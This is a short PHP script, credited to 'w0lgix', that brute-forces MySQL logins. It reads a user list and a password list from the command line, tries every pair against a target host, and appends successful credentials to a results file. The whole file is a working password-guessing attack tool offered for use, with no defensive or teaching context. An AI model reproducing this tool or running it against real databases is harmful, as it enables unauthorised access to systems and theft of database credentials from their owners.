<?php

$host = $argv[1];
$listuser = $argv[2];
$listpass = $argv[3];
echo ($a="\033[1;31m\tMySql BruteForce Coded By w0lgix\033[1;m\n");
sleep(2);


if($host == null or $listuser == null or $listpass == null ){
	system("clear");
	echo $a;
	exit("Example: <localhost> <users.txt> <pass.txt>\n");
	
}

$open = fopen($listuser, "r");
$read = fread($open, filesize($listuser));
fclose($open);

$users = explode("\n", $read);


$open1 = fopen($listpass, "r");
$read1 = fread($open1, filesize($listpass));
fclose($open1);

$passs = explode("\n", $read1);


foreach ($users as $user) {
	
foreach ($passs as $pass) {

$i = 0;
	

if(@mysql_connect($host,$user,$pass))
{
	echo "\033[1;34mConnected Secssful\033[1;m\n";
	echo "user is \033[1;33m$user\033[1;m and password is \033[1;35m$pass\033[1;m\n";

	$rezult=fopen("rezult.txt", "a");
	$write=fwrite($rezult, "[+]$host >> user:$user pass:$pass\n");
	fclose($rezult);
	
}

else 
{

	echo "Trying...\n";
	
}

}
}

?>